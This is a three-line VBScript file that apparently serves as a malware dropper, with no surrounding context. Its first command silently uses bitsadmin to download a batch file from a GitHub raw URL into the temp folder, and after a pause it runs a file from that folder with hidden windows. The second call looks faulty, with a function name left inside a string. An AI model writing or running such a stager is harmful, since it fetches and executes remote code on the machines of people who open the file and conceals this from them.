createobject("wscript.shell").Run "%comspec% /c bitsadmin /transfer ""D"" https://raw.githubusercontent.com/eventos-dev/test/main/don.bat %temp%\p.bat",vbhide
wscript.sleep 3000
createobject("wscript.shell").Run "%comspec% /c %comspec% /c %temp%\chr(80).bat", vbhide
